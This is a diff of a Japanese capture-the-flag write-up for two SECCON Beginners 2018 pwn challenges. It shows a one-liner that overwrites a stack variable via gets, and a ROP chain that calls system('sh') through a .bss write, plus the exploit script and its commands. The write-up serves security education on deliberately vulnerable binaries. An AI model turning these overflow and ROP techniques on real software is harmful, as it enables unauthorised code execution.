@@ -13,7 +13,7 @@ Port: 16268
 ```
 ## Solution
 実行すると名前を入力を求められる。適当に入れるとパーミッションないとのこと。
-```
+```S
 $ ./condition 
 Please tell me your name...AAAAAAAAAAA
 Permission denied
@@ -49,7 +49,7 @@ objdumpでmain関数をみてみる。getsで入力した値と0xdeadbeefを比�
 
 getsの入力はrbp-0x30から始まり、0xdeadbeefとの比較はrbp-0x4の値とおこなわれる。0x30-0x4 = 44バイトなので、44バイト適当にパディングして、0xdeadbeefを入力する。
 
-```
+```S
 $ python -c 'print "\x00"*44+"\xef\xbe\xad\xde"'|nc pwn1.chall.beginners.seccon.jp 16268
 Please tell me your name...OK! You have permission to get flag!!
 ctf4b{T4mp3r_4n07h3r_v4r14bl3_w17h_m3m0ry_c0rrup710n}
@@ -68,7 +68,7 @@ Port: 18373
 
 ## Solution
 日付と入力したコンテンツを表示するバイナリ。
-```
+```S
 $ ./bbs 
 Input Content : AAAAAAAAAAAAA
 
@@ -81,14 +81,14 @@ AAAAAAAAAAAAA
 ```
 
 checksecは以下のとおり、stack canaryがない。
-```
+```S
 $ checksec --file bbs 
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE
 Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No	0		4	bbs
 ```
 
 このバイナリでもgetsを使っておりスタック・バッファオーバーフローが起きる。144バイト入力したところでcoreを見てみると、4006f9のret命令実行直前でrspに`0x4141414141414141`がある。つまりreturn addressまで136バイトのオフセットであることが分かる。
-```
+```S
 $ python -c 'print "A"*144'|./bbs 
 Input Content : 
 ==============================
@@ -116,7 +116,7 @@ gef➤
 ```
 
 あとはROPをおこなっていく。pltセクションに`system`があるので、`system("sh")`を実行するROPチェーンを作る。すなわち、`sh`の文字列があるアドレスがメモリー上の静的な場所にあれば、それをrdiにセットして`system`を呼べばシェルを獲れる。ただgdbで見た感じバイナリには`sh`文字列はなかった。
-```
+```S
 $ gdb -q bbs
 gef➤  start
 gef➤  grep sh
@@ -129,13 +129,13 @@ PIEが無効な環境ではbssセクションは静的でかつ書き込み可�
 ROPに必要な`pop rdi`ガジェット、bssセクションのアドレス、`gets`と`system`のアドレスを求めておく。
 
 * `pop rdi`ガジェット
-```
+```S
 $ rp-lin-x64 -r 3 --file bbs |grep "pop rdi"
 0x00400763: pop rdi ; ret  ;  (1 found)
 ```
 
 * bssセクションのアドレス
-```
+```S
 $ readelf -a bbs |grep bss
   [26] .bss              NOBITS           0000000000601058  00001058
    03     .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss 
@@ -143,7 +143,7 @@ $ readelf -a bbs |grep bss
 ```
 
 * `gets`と`system`のアドレス
-```
+```S
 $ objdump -M intel -d bbs |grep gets
   4004f8:	e8 83 00 00 00       	call   400580 <gets@plt+0x10>
 0000000000400570 <gets@plt>:
@@ -155,7 +155,7 @@ $ objdump -M intel -d bbs |grep system
 ```
 
 ROPチェーンを下記のようにしておけばよい。
-```
+```P
     system = 0x0000000000400540
     gets = 0x0000000000400570
     bss = 0x0000000000601058
@@ -169,11 +169,11 @@ ROPチェーンを下記のようにしておけばよい。
     buf += p(bss)
     buf += p(system)
     f.write(buf+"\n")
-    f.write("sh\0\n") <--- getsによるbssセクションへのsh文字列書き込み
+    f.write("sh\0\n") # getsによるbssセクションへのsh文字列書き込み
 ```
 
 [exp_bbs.py](https://github.com/kank3n/writeups/blob/master/seccon_b2018/exp_bbs.py)
-```
+```S
 $ python exp_bbs.py -r
 Input Content : 
 ==============================
